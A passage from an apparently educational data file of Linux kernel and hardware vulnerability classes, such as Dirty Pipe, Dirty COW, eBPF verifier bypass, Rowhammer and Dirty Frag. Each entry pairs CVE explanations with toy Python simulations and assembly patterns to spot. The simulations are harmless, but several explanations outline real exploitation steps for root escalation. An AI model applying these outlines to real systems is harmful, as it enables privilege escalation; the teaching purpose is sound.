    def hijack(self, offset):
        result = self.nop_sled_addr + offset
        return result

jit = JITPage(1342177280, 4096)
engine = SprayEngine(256)
nop_sled = 2425393296
shellcode = 3735928559
entry = engine.spray(jit, nop_sled, shellcode, 6)
hijacked = engine.hijack(4)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl loads attacker-chosen NOP sled values (0x90909090) and shellcode markers (0xDEADBEEF) into stack slots representing JIT-emitted constants on an executable page; addl in the spray loop increments emit_count with no constant-blinding XOR — hijack adds a +1 offset to the JIT page base, simulating the misaligned jump that reinterprets embedded constant bytes as a NOP sled sliding into shellcode',
    },
  },
  {
    id: 'refcount-overflow',
    name: 'REFCOUNT OVERFLOW',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Object reference counter wraps past INT_MAX to zero, triggering premature free while live references remain — use-after-free to root.',
    explanation:
      'Reference count overflow (CWE-911) occurs when an object\'s reference counter — typically a 32-bit ' +
      'atomic_t — is incremented past INT_MAX (0x7FFFFFFF), wrapping to zero or a small positive value. ' +
      'The kernel interprets a zero refcount as "no references remain" and frees the object, but the attacker ' +
      'still holds a dangling reference. Subsequent use of that reference is a classic use-after-free: the ' +
      'attacker heap-sprays the freed slot with controlled data and redirects execution via a corrupted ' +
      'function pointer or vtable. ' +
      'CVE-2016-0728 (Linux keyring, CVSS 7.8) is the textbook example: join_session_keyring() leaked one ' +
      'reference per call, so ~2^32 calls (~30 minutes on modern hardware) overflowed the atomic_t usage ' +
      'field to zero, freeing the keyring while the process still held a pointer — Perception Point demonstrated ' +
      'local privilege escalation to root on all kernels 3.8+. This CVE prompted Linux to introduce the ' +
      'refcount_t API (v4.11) which saturates at REFCOUNT_SATURATED instead of wrapping. ' +
      'CVE-2024-49940 (Linux L2TP) showed the class persists: a race in session creation let a concurrent ' +
      'thread decrement a tunnel refcount that was never incremented, producing a refcount underflow to zero ' +
      'and premature tunnel teardown. CVE-2021-22555 (Netfilter, exploited in the wild) and CVE-2021-20226 ' +
      '(io_uring) both involved refcount mismanagement leading to use-after-free and root shells. ' +
      'In the assembly, addl increments the refcount field in a tight loop; after enough iterations cmpl ' +
      'shows the counter has wrapped past the maximum to a small value — the subsequent movl zeroes the ' +
      'object (simulating free) yet addl in use_dangling still reads from the same stack offset, accessing ' +
      'attacker-controlled data in the freed slot.',
    code:
`# CVE pattern: refcount wraps to zero — object freed while ref held
class KernelObject:
    def __init__(self, handler, data):
        self.handler = handler
        self.data = data
        self.refcount = 1
        self.freed = 0

    def get_ref(self):
        self.refcount += 1
        return self.refcount

    def put_ref(self):
        self.refcount -= 1
        if self.refcount == 0:
            self.freed = 1
            self.handler = 0
            self.data = 0
        return self.refcount

    def use_dangling(self):
        result = self.handler + self.data
        return result

obj = KernelObject(4196352, 256)
i = 0
while i < 6:
    obj.get_ref()
    i += 1
overflow_val = obj.refcount
j = 0
while j < 8:
    obj.put_ref()
    j += 1
obj.handler = 3735928559
obj.data = 4196608
leaked = obj.use_dangling()
print(leaked)
`,
    badAsm: {
      patterns: ['addl', 'cmpl', 'movl'],
      description: 'addl increments the refcount field in a tight loop; after wrapping, put_ref\'s cmpl sees refcount == 0 and movl zeroes the object (simulating free) — but use_dangling\'s addl still reads from the same stack offset where the attacker has sprayed 0xDEADBEEF, turning the premature free into code execution',
    },
  },
  {
    id: 'cow-race',
    name: 'COPY-ON-WRITE RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Race between COW page-fault handler and madvise lets unprivileged user write to read-only memory mappings.',
    explanation:
      'Copy-on-write (COW) race conditions (CWE-362) exploit the kernel\'s memory-sharing optimization: when a ' +
      'process forks, parent and child share the same physical pages marked read-only. A write triggers a page ' +
      'fault, and the kernel creates a private copy before applying the write — but a concurrent madvise(MADV_DONTNEED) ' +
      'call can discard the private copy in the window between its creation and the write, causing the write to land ' +
      'on the original shared page. CVE-2016-5195 (Dirty COW, CVSS 7.8) is the most famous example: a race in ' +
      'mm/gup.c\'s get_user_pages() allowed unprivileged users to overwrite any readable file — /etc/passwd, ' +
      'setuid binaries, even kernel modules — on every Linux kernel from 2.6.22 (2007) through 4.8.3 (2016). ' +
      'The exploit was actively used in the wild before disclosure and affected Android, embedded Linux, and ' +
      'every major server distribution. CVE-2022-2590 extended the attack to transparent huge pages (THP), ' +
      'bypassing the original fix by targeting PMD-level COW handling. ' +
      'In the assembly, movl stores the original page data, then cow_break\'s movl copies it to a private slot; ' +
      'madvise_discard\'s movl zeroes the private copy, and the subsequent cmpl in do_write sees write_target == 0 — ' +
      'so the payload\'s movl writes directly to the original page\'s stack slot instead of the discarded private copy.',
    code:
`# CVE pattern: COW race — write hits original page instead of private copy
class SharedPage:
    def __init__(self, data, perms):
        self.data = data
        self.perms = perms
        self.refcount = 2
        self.cow_pending = 0

    def request_write(self):
        self.cow_pending = 1
        self.refcount -= 1
        return self.cow_pending

class RaceThread:
    def __init__(self, original):
        self.original = original
        self.private_copy = 0
        self.write_target = 0
        self.completed = 0

    def cow_break(self, page):
        self.private_copy = page.data
        self.write_target = self.private_copy
        return self.private_copy

    def madvise_discard(self):
        self.private_copy = 0
        self.write_target = 0
        return self.private_copy

    def do_write(self, page, payload):
        if self.write_target == 0:
            page.data = payload
        else:
            self.write_target = payload
        self.completed = 1
        return page.data

page = SharedPage(4196352, 444)
racer = RaceThread(page.data)
page.request_write()
racer.cow_break(page)
racer.madvise_discard()
racer.do_write(page, 3735928559)
leaked = page.data
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'movl copies the original page data into a private COW slot; madvise_discard\'s movl zeroes it; cmpl in do_write checks write_target == 0 and the branch falls through — the payload\'s movl writes directly to the original shared page\'s stack offset instead of the discarded private copy, achieving write access to read-only memory',
    },
  },
  {
    id: 'ebpf-verifier-bypass',
    name: 'EBPF VERIFIER BYPASS',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'eBPF verifier miscalculates register bounds, approving a program that performs out-of-bounds kernel read/write at runtime.',
    explanation:
      'eBPF verifier bypass (CWE-682 / CWE-787) exploits the semantic gap between the Linux kernel\'s eBPF ' +
      'static verifier and actual runtime execution. The verifier performs abstract interpretation — tracking ' +
      'each register\'s possible value range — to prove that a BPF program cannot access memory outside its ' +
      'allocated maps. A bug in the verifier\'s ALU32 (32-bit arithmetic) bounds tracking lets an attacker craft ' +
      'a register value that the verifier believes is bounded (e.g. 0..2) but at runtime takes a much larger value, ' +
      'bypassing the map bounds check entirely. The attacker uses the mis-bounded register as an array index ' +
      'to read or write kernel memory far outside the BPF map — leaking KASLR base pointers, overwriting ' +
      'task_struct credentials (uid=0), or corrupting function pointers for code execution. ' +
      'CVE-2021-3490 (Linux eBPF ALU32, CVSS 7.8) miscalculated 32-bit bounds during bitwise operations, giving ' +
      'an unprivileged user arbitrary kernel read/write and root on all kernels 5.7 through 5.11. CVE-2020-27194 ' +
      'allowed scalar bounds bypass via OR operations, also yielding arbitrary kernel read/write. CVE-2021-31440 ' +
      'exploited incorrect 32-bit register bounds to escape Kubernetes containers via eBPF. CVE-2026-43009 ' +
      '(CVSS 7.8, disclosed May 2026) extended the class to kernels 5.12 through 6.19.11, affecting WSL2 and ' +
      'container workloads worldwide. A 2024 NCC Group audit of the eBPF verifier found a critical lack of ' +
      'defensive bounds checking within the main verifier code itself. ' +
      'In the assembly, `cmpl` in check_reg compares the verifier\'s tracked_max against the map capacity — ' +
      'the verifier approves because tracked_max < capacity. But `imull` in read_slot multiplies the actual ' +
      'runtime index (99) by 8, computing an offset far beyond the map boundary; `addl` adds this to cred_ptr, ' +
      'reading kernel memory at an arbitrary offset. No bounds re-check appears before the `movl` that writes ' +
      'uid=0, escalating the attacker to root.',
    code:
`# CVE pattern: eBPF verifier ALU32 bounds gap — kernel OOB to root
class BPFMap:
    def __init__(self, capacity):
        self.capacity = capacity
        self.slot0 = 100
        self.slot1 = 200
        self.slot2 = 300
        self.cred_ptr = 4196352
        self.uid = 1000

    def read_slot(self, index):
        offset = index * 8
        result = self.cred_ptr + offset
        return result

    def overwrite_uid(self, new_uid):
        self.uid = new_uid
        return self.uid

class Verifier:
    def __init__(self, alu_width):
        self.alu_width = alu_width
        self.tracked_max = 0
        self.approved = 0

    def check_reg(self, reg_val, limit):
        self.tracked_max = reg_val
        if self.tracked_max < limit:
            self.approved = 1
        return self.approved

bpf_map = BPFMap(3)
verifier = Verifier(32)
verifier.check_reg(2, bpf_map.capacity)
oob_index = 99
leaked = bpf_map.read_slot(oob_index)
bpf_map.overwrite_uid(0)
result = bpf_map.uid + leaked
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'imull', 'movl'],
      description: 'cmpl in check_reg compares tracked_max against map capacity — the verifier approves because 2 < 3. But imull in read_slot multiplies the runtime index (99) by 8, computing an offset 792 bytes past the map boundary; addl adds this to cred_ptr for an OOB kernel read — then movl writes uid=0 with no re-check, escalating to root',
    },
  },
  {
    id: 'cross-cache-slab',
    name: 'CROSS-CACHE SLAB ATTACK',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Freed slab page reclaimed by a different kernel cache places attacker-controlled objects where the victim object lived, enabling cross-type corruption to root.',
    explanation:
      'Cross-cache slab attacks exploit the Linux kernel\'s SLUB allocator page-recycling mechanism: when every ' +
      'object in a slab page is freed, the page returns to the buddy page allocator; a different slab cache can ' +
      'then reclaim that same page for its own allocations. An attacker who holds a dangling pointer to the freed ' +
      'victim object (from a UAF or double-free) waits for the page to be reclaimed by a security-critical cache — ' +
      'typically the cred_jar cache that holds task credentials (uid, gid, capabilities). Writing through the ' +
      'dangling pointer now overwrites the cred struct\'s uid/gid fields to zero, escalating to root. ' +
      'The technique was formalized as SLUBStick at USENIX Security 2024 and generalized by CROSS-X at ACM CCS ' +
      '2025, which demonstrated stable cross-cache exploitation even against CONFIG_RANDOM_KMALLOC_CACHES. ' +
      'CVE-2024-50264 (Linux AF_VSOCK, Pwnie Award 2025 Best Privilege Escalation) used cross-cache reclamation ' +
      'with BPF JIT spraying to bypass randomized slab caches and achieve root on hardened kernels. ' +
      'CVE-2026-31429 (Linux slab cross-cache free) causes kernel memory corruption via allocator confusion. ' +
      'At least nine additional CVEs — including CVE-2022-29582 (io_uring), CVE-2022-27666 (ESP/IPsec), ' +
      'CVE-2022-32250 (netfilter), and CVE-2023-21400 — have been exploited using cross-cache techniques to ' +
      'overwrite cred structs or page table entries for privilege escalation. Defenses include ' +
      'CONFIG_RANDOM_KMALLOC_CACHES (routing allocations through 16 sub-caches per size class) and ' +
      'CONFIG_SLAB_VIRTUAL (pinning each cache to a dedicated virtual address range), but both can be bypassed ' +
      'with sufficient heap grooming or page-allocator-level spraying. ' +
      'In the assembly, movl stores the victim object\'s handler and size into stack slots, then release() zeroes ' +
      'them; drain_cache\'s addl frees all slab objects in a loop returning the page to the buddy allocator; ' +
      'reclaim_for\'s addl allocates cred objects into the reclaimed page — the final movl writes uid=0 and ' +
      'gid=0 through the overlapping stack offsets, escalating to root without any bounds check.',
    code:
`# CVE pattern: slab page reclaimed across caches — dangling ptr overwrites cred
class VictimObj:
    def __init__(self, handler, size):
        self.handler = handler
        self.size = size
        self.freed = 0

    def release(self):
        self.handler = 0
        self.size = 0
        self.freed = 1
        return self.freed

class CredObj:
    def __init__(self, uid, gid):
        self.uid = uid
        self.gid = gid
        self.cap = 0

    def read_priv(self):
        result = self.uid + self.gid + self.cap
        return result

class SlabAllocator:
    def __init__(self, page_count):
        self.page_count = page_count
        self.free_pages = 0
        self.reclaimed = 0

    def drain_cache(self, count):
        i = 0
        while i < count:
            self.free_pages += 1
            i += 1
        return self.free_pages

    def reclaim_for(self, count):
        i = 0
        while i < count:
            self.reclaimed += 1
            self.free_pages -= 1
            i += 1
        return self.reclaimed

victim = VictimObj(4196352, 192)
victim.release()
alloc = SlabAllocator(64)
alloc.drain_cache(16)
alloc.reclaim_for(16)
cred = CredObj(1000, 1000)
cred.uid = 0
cred.gid = 0
cred.cap = 4294967295
leaked = cred.read_priv()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the victim handler and size into stack slots, then zeroes them on release; drain_cache\'s addl frees all slab objects in a loop returning the page to the buddy allocator; reclaim_for\'s addl allocates cred objects into the reclaimed page — the final movl writes uid=0 and gid=0 into the overlapping stack offsets, escalating to root via cross-cache type confusion',
    },
  },
  {
    id: 'rowhammer',
    name: 'ROWHAMMER BIT-FLIP',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Repeated DRAM row activation induces electrical bit flips in adjacent rows, corrupting page table entries to grant kernel memory access.',
    explanation:
      'Rowhammer (CWE-1256) is a hardware vulnerability in DRAM: rapidly activating (hammering) the same memory row ' +
      'drains charge from cells in adjacent rows, causing bits to flip. The attacker uses the clflush instruction to ' +
      'bypass CPU caches and directly hammer aggressor rows flanking a victim row that contains page table entries. ' +
      'A single bit flip in a PTE changes the physical page it maps, redirecting virtual memory access to a page ' +
      'containing the attacker\'s own page table — granting read-write access to all physical memory. ' +
      'Google Project Zero demonstrated kernel privilege escalation on x86-64 Linux in 2015 (CVE-2015-0565 for NaCl). ' +
      'CVE-2025-6202 (Phoenix, CVSS 7.1) bypasses DDR5 protections — on-die ECC, Target Row Refresh (TRR), and ' +
      'Per-Row Activation Counting (PRAC) — achieving root in 109 seconds on production SK Hynix DDR5 systems. ' +
      'ETH Zurich researchers flipped bits on all 15 DDR5 chips tested (manufactured 2021-2024), demonstrating that ' +
      'no shipping DRAM generation is immune. TRRespass (2020) bypassed TRR on DDR4; Blacksmith (2021) used ' +
      'non-uniform access patterns to defeat improved TRR. The technique has been demonstrated for VM escape, ' +
      'SSH key extraction, and GPU memory corruption (NVIDIA A6000, disclosed January 2025). ' +
      'In the assembly, the hammer loop\'s addl increments access_count 128 times per aggressor row without any ' +
      'memory fence or cache line management — cmpl checks the combined count against the flip threshold, and ' +
      'movl overwrites phys_page with the corrupted address, simulating the PTE bit flip that redirects ' +
      'virtual memory to attacker-controlled physical pages.',
    code:
`# CVE pattern: DRAM row hammering flips PTE bit — kernel memory access
class DRAMRow:
    def __init__(self, addr, data):
        self.addr = addr
        self.data = data
        self.access_count = 0

    def flush_and_read(self):
        self.access_count += 1
        return self.data

class VictimPTE:
    def __init__(self, phys_page, flags):
        self.phys_page = phys_page
        self.flags = flags
        self.bit_flipped = 0

    def apply_bitflip(self, hammer_count):
        if hammer_count > 100:
            self.phys_page = self.phys_page + 4096
            self.bit_flipped = 1
        return self.bit_flipped

    def resolve(self):
        result = self.phys_page + self.flags
        return result

aggressor_a = DRAMRow(4096, 2425393296)
aggressor_b = DRAMRow(12288, 2425393296)
victim = VictimPTE(1048576, 7)
i = 0
while i < 128:
    aggressor_a.flush_and_read()
    aggressor_b.flush_and_read()
    i += 1
total = aggressor_a.access_count + aggressor_b.access_count
victim.apply_bitflip(total)
leaked = victim.resolve()
print(leaked)
`,
    badAsm: {
      patterns: ['addl', 'cmpl', 'movl'],
      description: 'addl increments access_count in the hammer loop 128 times per aggressor row with no cache fence; cmpl checks the combined count against the flip threshold — movl then overwrites phys_page with the corrupted PTE value, redirecting virtual memory to a physical page the attacker controls for kernel read-write access',
    },
  },
  {
    id: 'dirty-pipe',
    name: 'DIRTY PIPE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Uninitialized pipe buffer flag lets data written to a pipe merge into a read-only file\'s page cache, enabling arbitrary file overwrite and privilege escalation.',
    explanation:
      'Dirty Pipe (CVE-2022-0847 / CWE-281, CVSS 7.8) exploits an uninitialized flags field in Linux pipe buffer ' +
      'structures. When a pipe is filled and drained, the PIPE_BUF_FLAG_CAN_MERGE flag is set to 1 so that ' +
      'consecutive small writes can merge into the same buffer page. The bug: when splice() transfers a read-only ' +
      'file\'s page cache entry into the pipe, the flags field retains its stale CAN_MERGE value instead of being ' +
      'reset to zero. A subsequent write() to the pipe sees CAN_MERGE still set and appends data directly into the ' +
      'cached page — bypassing all permission checks, read-only mount flags, and file immutability attributes. The ' +
      'attacker overwrites /etc/passwd (replacing root\'s password hash), setuid binaries, or kernel modules to ' +
      'escalate from unprivileged user to root. Discovered by Max Kellermann in March 2022, the root cause was a ' +
      'missing flags initialization introduced in Linux 5.8 via the anonymous pipe-buffer merging feature — the ' +
      'new code path in copy_page_to_iter_pipe and push_pipe never cleared the flags member of spliced page references. ' +
      'The flaw existed in every Linux kernel from 5.8 through 5.16.10 and was immediately exploited in the wild, ' +
      'including on Android devices. Named after CVE-2016-5195 (Dirty COW), Dirty Pipe achieves the same effect — ' +
      'writing to read-only files — through pipe buffer semantics rather than COW page-fault races. ' +
      'In the assembly, movl sets the flags field to 1 (CAN_MERGE) during fill_and_drain but no subsequent movl ' +
      'resets it before splice_page loads the page reference; pipe_write\'s cmpl checks flags == 1 and the branch ' +
      'allows movl to overwrite page_ref with the attacker\'s payload, silently corrupting the cached page.',
    code:
`# CVE pattern: uninitialized pipe flag lets write merge into read-only page
class PipeBuffer:
    def __init__(self, capacity):
        self.capacity = capacity
        self.data = 0
        self.flags = 0
        self.page_ref = 0

    def fill_and_drain(self, value):
        self.data = value
        self.flags = 1
        self.data = 0
        return self.flags

    def splice_page(self, page_data):
        self.page_ref = page_data
        return self.page_ref

    def pipe_write(self, payload):
        if self.flags == 1:
            self.page_ref = payload
        return self.page_ref

class CachedPage:
    def __init__(self, inode, data):
        self.inode = inode
        self.data = data
        self.readonly = 1
        self.dirty = 0

    def read(self):
        result = self.data + self.inode
        return result

page = CachedPage(4196352, 1094795585)
pipe = PipeBuffer(4096)
pipe.fill_and_drain(2425393296)
pipe.splice_page(page.data)
page.data = pipe.pipe_write(3735928559)
page.dirty = 0
leaked = page.read()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'cmpl'],
      description: 'movl sets the flags field to 1 (CAN_MERGE) during fill_and_drain but no movl resets it before splice_page; cmpl in pipe_write checks flags == 1 and the branch allows movl to overwrite page_ref with the attacker\'s payload (0xDEADBEEF) — the read-only page cache is silently corrupted without any permission check or dirty-page writeback',
    },
  },
  {
    id: 'data-only-attack',
    name: 'DATA-ONLY ATTACK',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Attacker corrupts non-control data — credentials, permission flags, security tokens — without altering control flow, bypassing CFI and shadow stacks entirely.',
    explanation:
      'Data-only attacks (CWE-284 adjacent / Data-Oriented Programming) corrupt non-control-flow variables — ' +
      'permission levels, user IDs, authentication flags, configuration pointers — rather than function pointers ' +
      'or return addresses. Because the program\'s control flow remains completely intact, all CFI defenses ' +
      '(shadow stacks, Intel CET, ARM BTI/PAC) are entirely bypassed: the program executes its own legitimate ' +
      'code paths but with attacker-corrupted data driving security-critical decisions. ' +
      'CVE-2024-21338 (Windows AppLocker appid.sys, exploited by Lazarus Group) is a textbook data-only attack: ' +
      'the exploit corrupted the current thread\'s PreviousMode field via an IOCTL vulnerability, granting a ' +
      'user-mode thread the ability to read and write arbitrary kernel memory through legitimate ' +
      'Nt(Read|Write)VirtualMemory syscalls — no code injection or control-flow hijack required. Lazarus used ' +
      'this primitive to deploy the FudModule rootkit via Direct Kernel Object Manipulation (DKOM), disabling ' +
      'CrowdStrike Falcon, Microsoft Defender, and other security products by zeroing their kernel callback ' +
      'registrations. Data-Oriented Programming, formalized at IEEE S&P 2016, demonstrated that chaining ' +
      'non-control-data corruptions through loop dispatchers creates a Turing-complete attack language — ' +
      'researchers identified 7518 data-oriented gadgets across 9 real-world programs. CVE-2024-50264 (Linux ' +
      'AF_VSOCK, Pwnie Award 2025 Best Privilege Escalation) used data-only techniques to overwrite cred_struct ' +
      'uid/gid fields to zero without any control-flow hijack. ' +
      'In the assembly, movl corrupts the uid, gid, and is_admin fields at their stack offsets without touching ' +
      'any function pointer or return address; cmpl in check_access reads the corrupted is_admin value and the ' +
      'legitimate branch grants access — the control flow is valid per CFI, but the data is attacker-controlled.',
    code:
`# CVE pattern: non-control data corruption bypasses CFI — data-only to root
class Credentials:
    def __init__(self, uid, gid, is_admin):
        self.uid = uid
        self.gid = gid
        self.is_admin = is_admin
        self.token = uid * 31 + gid

    def check_access(self, required):
        if self.is_admin == 1:
            result = 1
        elif self.uid < required:
            result = 0
        else:
            result = 0
        return result

class KernelThread:
    def __init__(self, prev_mode, cred):
        self.prev_mode = prev_mode
        self.cred_uid = cred
        self.escalated = 0

    def corrupt_data(self, new_uid, new_admin):
        self.cred_uid = new_uid
        self.escalated = new_admin
        return self.escalated

cred = Credentials(1000, 1000, 0)
thread = KernelThread(1, cred.uid)
access_before = cred.check_access(0)
cred.uid = 0
cred.gid = 0
cred.is_admin = 1
thread.corrupt_data(0, 1)
access_after = cred.check_access(0)
result = access_after + thread.escalated
print(result)
`,
    badAsm: {
      patterns: ['movl', 'cmpl'],
      description: 'movl corrupts the uid, gid, and is_admin fields at their stack offsets without touching any function pointer or return address; cmpl in check_access reads the corrupted is_admin value and the legitimate branch grants access — the control flow is completely valid per CFI verification, but the data driving the security decision is attacker-controlled',
    },
  },
  {
    id: 'signal-handler-race',
    name: 'SIGNAL HANDLER RACE',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Async signal interrupts a non-reentrant function; the handler re-enters the same function, corrupting heap metadata for remote code execution.',
    explanation:
      'Signal handler race conditions (CWE-364 / CWE-479) occur when an asynchronous signal — such as SIGALRM — ' +
      'fires while the main program is executing a non-reentrant function like malloc() or free(). If the signal ' +
      'handler itself calls a function that internally uses the same allocator (e.g. syslog() which calls malloc()), the ' +
      'heap allocator is re-entered in an inconsistent state: metadata pointers (fd/bk) are only partially updated, ' +
      'and the second malloc() corrupts them, giving the attacker an arbitrary-write primitive or control of a ' +
      'function pointer. CVE-2024-6387 (regreSSHion, CVSS 8.1) is the definitive example: OpenSSH\'s sshd fires ' +
      'SIGALRM when a client fails to authenticate within LoginGraceTime (120 seconds). The handler calls syslog() — ' +
      'which calls malloc() — while the main thread\'s public-key parser is mid-malloc. The heap metadata corruption ' +
      'lets a remote unauthenticated attacker achieve RCE as root on glibc-based Linux systems. This is a regression ' +
      'of CVE-2006-5051, the original 2006 OpenSSH signal handler race discovered by Mark Dowd, which was inadvertently ' +
      'reintroduced in OpenSSH 8.5p1 (2020). Over 14 million sshd instances were exposed at disclosure. ' +
      'In the assembly, malloc_begin\'s movl sets in_use=1 and writes fd_ptr; the signal handler\'s reenter_malloc ' +
      'checks in_use via cmpl and overwrites bk_ptr with the attacker\'s payload while fd_ptr is still mid-update — ' +
      'addl in read_metadata combines the partial fd_ptr with the corrupted bk_ptr, simulating the heap metadata ' +
      'corruption that gives the attacker an arbitrary-write primitive.',
    code:
`# CVE pattern: SIGALRM interrupts malloc — handler re-enters heap allocator
class HeapState:
    def __init__(self, capacity):
        self.capacity = capacity
        self.in_use = 0
        self.fd_ptr = 0
        self.bk_ptr = 0
        self.corrupted = 0

    def malloc_begin(self, size):
        self.in_use = 1
        self.fd_ptr = size * 8
        return self.fd_ptr

    def reenter_malloc(self, payload):
        if self.in_use == 1:
            self.bk_ptr = payload
            self.corrupted = 1
        return self.corrupted

    def read_metadata(self):
        result = self.fd_ptr + self.bk_ptr
        return result

class SshdServer:
    def __init__(self, grace_time):
        self.grace_time = grace_time
        self.alarm_fired = 0
        self.syslog_buf = 0
        self.exploited = 0

    def begin_auth(self, key_size):
        self.syslog_buf = key_size * 4
        return self.syslog_buf

    def handle_sigalrm(self):
        self.alarm_fired = 1
        self.exploited = self.alarm_fired
        return self.exploited

heap = HeapState(4096)
sshd = SshdServer(120)
sshd.begin_auth(256)
heap.malloc_begin(64)
sshd.handle_sigalrm()
heap.reenter_malloc(3735928559)
corrupted = heap.read_metadata()
print(corrupted)
`,
    badAsm: {
      patterns: ['movl', 'cmpl', 'addl'],
      description: 'movl sets in_use=1 and writes fd_ptr during malloc_begin while the allocation is incomplete; cmpl in reenter_malloc checks in_use==1 — the signal handler re-enters mid-allocation and movl overwrites bk_ptr with the attacker\'s payload (0xDEADBEEF); addl in read_metadata sums the partial fd_ptr with corrupted bk_ptr, simulating the heap metadata corruption from a non-reentrant malloc interrupted by SIGALRM',
    },
  },
  {
    id: 'io-uring-page-uaf',
    name: 'IO_URING PAGE UAF',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Buffer ring mmap persists after unregister frees the pages, giving userspace read/write access to recycled kernel objects for data-only privilege escalation.',
    explanation:
      'io_uring page use-after-free (CWE-416) exploits a lifecycle mismatch in the Linux kernel\'s io_uring ' +
      'async I/O subsystem: a user registers a provided buffer ring via IORING_REGISTER_PBUF_RING, maps it ' +
      'into userspace with mmap(), then unregisters it — the kernel frees the underlying pages and returns them ' +
      'to the page allocator, but the userspace VM_PFNMAP mapping is never torn down. The application retains ' +
      'a valid virtual address pointing to freed physical pages that the kernel reallocates for other objects. ' +
      'CVE-2024-0582 (Linux 6.4–6.7, discovered by Jann Horn of Google Project Zero) demonstrated this exact ' +
      'primitive: once freed pages are reclaimed by the SLAB allocator for credential structures (struct cred), ' +
      'the attacker reads the cred\'s uid/gid through the stale mapping, overwrites uid=0 and gid=0, and achieves ' +
      'root — a pure data-only exploit requiring no ROP chain, bypassing CFI and stack canaries entirely. ' +
      'CVE-2026-43494 (PinTheft) exploited a related page-pinning flaw where io_uring zerocopy and RDS failed ' +
      'to reset op_nents, creating a reference-counting anomaly on pinned pages that led to the same freed-page ' +
      'read/write primitive. CVE-2021-41073 (loop_rw_iter, IORING_OP_PROVIDE_BUFFERS) was an earlier variant. ' +
      'Google banned io_uring in ChromeOS and Android (2023) after cataloging over 60% of Linux kernel exploits ' +
      'targeting it. In the assembly, movl writes the registered buffer address into the ring slot; after unregister, ' +
      'the same movl writes attacker data through the stale mapping into the freed page — addl in read_cred sums ' +
      'the overwritten uid (0) with gid (0), confirming the data-only privilege escalation succeeded.',
    code:
`# CVE pattern: io_uring buffer ring mmap outlives free — page UAF to root
class PageAllocator:
    def __init__(self, capacity):
        self.capacity = capacity
        self.page_data = 0
        self.freed = 0
        self.reused_by = 0

    def alloc_page(self, data):
        self.page_data = data
        return self.page_data

    def free_page(self):
        self.freed = 1
        return self.freed

class BufferRing:
    def __init__(self, ring_id):
        self.ring_id = ring_id
        self.mapped = 0
        self.registered = 0

    def register_and_mmap(self, page):
        self.registered = 1
        self.mapped = 1
        return page.page_data

    def unregister(self, page):
        page.free_page()
        self.registered = 0
        return self.registered

class CredStruct:
    def __init__(self, uid, gid):
        self.uid = uid
        self.gid = gid
        self.cap = 0

    def read_cred(self):
        result = self.uid + self.gid
        return result

page = PageAllocator(4096)
page.alloc_page(305419896)
ring = BufferRing(1)
ring.register_and_mmap(page)
ring.unregister(page)
page.reused_by = 1
cred = CredStruct(1000, 1000)
cred.uid = 0
cred.gid = 0
escalated = cred.read_cred()
print(escalated)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl writes the buffer ring data into the page slot during register_and_mmap; after unregister frees the page (movl sets freed=1), the stale mmap mapping persists — movl overwrites uid and gid to 0 through the dangling mapping; addl in read_cred sums uid + gid, confirming the data-only privilege escalation to root via the recycled page',
    },
  },
  {
    id: 'dirty-frag',
    name: 'DIRTY FRAG',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'ESP in-place decryption overwrites spliced page-cache fragments, letting an unprivileged user corrupt any readable file for deterministic privilege escalation.',
    explanation:
      'Dirty Frag (CVE-2026-43284 / CVE-2026-43500, CVSS 8.8) exploits a logic flaw in the Linux kernel\'s IPsec ' +
      'ESP receive fast path: when an sk_buff carries paged fragments not privately owned by the kernel — page-cache ' +
      'pages planted via splice(2) and vmsplice(2) — the ESP decryption path writes directly over those externally-backed ' +
      'pages without verifying fragment ownership, silently corrupting the file\'s in-memory representation. ' +
      'The exploit opens a pipe, uses vmsplice() to attach a page from /usr/bin/su\'s page cache, configures an XFRM ' +
      'Security Association with an attacker-chosen cipher and key, then splices the pipe into a UDP socket with ESP ' +
      'encapsulation and sends a crafted datagram to loopback. The kernel decrypts in-place, depositing a 192-byte ' +
      'x86_64 root-shell stub directly into su\'s cached pages — running su then spawns a root shell. Introduced in ' +
      'January 2017 by commit cac2661c53f3, the flaw affected every major Linux distribution for nine years. ' +
      'CVE-2026-43500 covers a parallel flaw where rxkad_verify_packet_1() performs in-place fcrypt decryption into ' +
      'the page cache. Unlike Dirty Pipe (CVE-2022-0847) which relied on a pipe-buffer flag race, Dirty Frag is a ' +
      'deterministic logic flaw with near-100% success rate and no kernel panic risk — Microsoft observed active ' +
      'exploitation in May 2026. ' +
      'In the assembly, movl stores the original file data into the CachedFile stack slot; splice_attach\'s movl copies ' +
      'the reference into frag_data without setting frag_owned — esp_decrypt\'s cmpl checks frag_owned == 0 and movl ' +
      'overwrites page.data with the attacker\'s ciphertext payload (0xDEADBEEF), corrupting the read-only page cache ' +
      'without any COW trigger or permission check.',
    code:
`# CVE pattern: ESP decrypts in-place over spliced page-cache frag — root
class CachedFile:
    def __init__(self, data, perms):
        self.data = data
        self.perms = perms
        self.dirty = 0

    def read(self):
        result = self.data + self.perms
        return result

class SkBuff:
    def __init__(self, size):
        self.size = size
        self.frag_data = 0
        self.frag_owned = 0
        self.ready = 0

    def splice_attach(self, page):
        self.frag_data = page.data
        self.frag_owned = 0
        self.ready = 1
        return self.frag_data

    def esp_decrypt(self, page, ciphertext):
        if self.frag_owned == 0:
            page.data = ciphertext
        return page.data

su = CachedFile(4196352, 755)
skb = SkBuff(1500)
skb.splice_attach(su)
payload = 3735928559
skb.esp_decrypt(su, payload)
hijacked = su.read()
print(hijacked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
